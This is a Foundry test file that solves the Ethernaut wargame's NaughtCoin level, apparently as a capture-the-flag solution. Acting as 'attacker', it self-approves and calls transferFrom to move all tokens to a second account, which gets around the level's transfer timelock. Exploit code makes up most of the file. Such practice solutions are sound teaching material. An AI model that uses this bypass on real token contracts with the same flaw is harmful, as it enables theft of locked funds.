// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Ethernaut game components
import {Ethernaut} from "src/core/Ethernaut-08.sol";
import {NaughtCoinFactory, NaughtCoin} from "src/levels/15-NaughtCoin/NaughtCoinFactory.sol";

contract NaughtCoinTest is Test {
    /*//////////////////////////////////////////////////////////////
                            GAME INSTANCE SETUP
    //////////////////////////////////////////////////////////////*/

    Ethernaut ethernaut;

    address attacker = makeNameForAddress("attacker");

    function setUp() public {
        emit log_string("Setting up NaughtCoin level...");
        ethernaut = new Ethernaut();
    }

    /*//////////////////////////////////////////////////////////////
                LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
    //////////////////////////////////////////////////////////////*/

    function test_NaughtCoinExploit() public {
        /*//////////////////////////////////////////////////////////////
                            LEVEL INSTANCE SETUP
        //////////////////////////////////////////////////////////////*/

        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();

        ethernaut.registerLevel(naughtCoinFactory);
        vm.startPrank(attacker);

        address levelAddress = ethernaut.createLevelInstance(naughtCoinFactory);

        NaughtCoin naughtCoinContract = NaughtCoin(levelAddress);

        /*//////////////////////////////////////////////////////////////
                                LEVEL EXPLOIT
        //////////////////////////////////////////////////////////////*/
        emit log_named_address("Attacker's address: ", address(attacker));
        emit log_string("Starting the exploit...");

        uint attackerBalanceBefore = naughtCoinContract.balanceOf(attacker);

        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_named_uint("Balance before", attackerBalanceBefore);

        // 1. Attacker creates another account.
        address anotherAttackerAccount = makeNameForAddress(
            "anotherAttackerAccount"
        );
        emit log_named_uint(
            "Balance of another account before attack",
            naughtCoinContract.balanceOf(anotherAttackerAccount)
        );
        emit log_string(
            "--------------------------------------------------------------------------"
        );
        // 2. Attacker approves himself to manage the whole amount of tokens before calling `transferFrom`.
        naughtCoinContract.approve(attacker, attackerBalanceBefore);

        // 3. Attacker calls `transferFrom`.
        naughtCoinContract.transferFrom(
            attacker,
            anotherAttackerAccount,
            attackerBalanceBefore
        );

        uint attackerBalanceAfter = naughtCoinContract.balanceOf(attacker);

        // 4. Attacker gets his token balance in the `NaughtCoin` contract to 0 because of transferring all his tokens to another account.
        emit log_named_uint("Balance after", attackerBalanceAfter);

        emit log_named_uint(
            "Balance of another account after attack",
            naughtCoinContract.balanceOf(anotherAttackerAccount)
        );
        emit log_string(
            "--------------------------------------------------------------------------"
        );
        // Assert that the attacker has no more tokens
        assertEq(naughtCoinContract.balanceOf(attacker), 0);

        // // Assert that the secondary account received all the tokens
        assertEq(
            naughtCoinContract.balanceOf(anotherAttackerAccount),
            attackerBalanceBefore
        );

        /*//////////////////////////////////////////////////////////////
                                LEVEL SUBMISSION
        //////////////////////////////////////////////////////////////*/

        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(challengeCompleted);
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * I've found this useful function
     * in github/twpony Ethernaut repo
     * @notice This function allows for creating labels (names) for addresses
     * which will improve readability in traces
     * @param name you pass the name like "alice" or "bob" and it will create
     * an address for that person
     */
    function makeNameForAddress(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
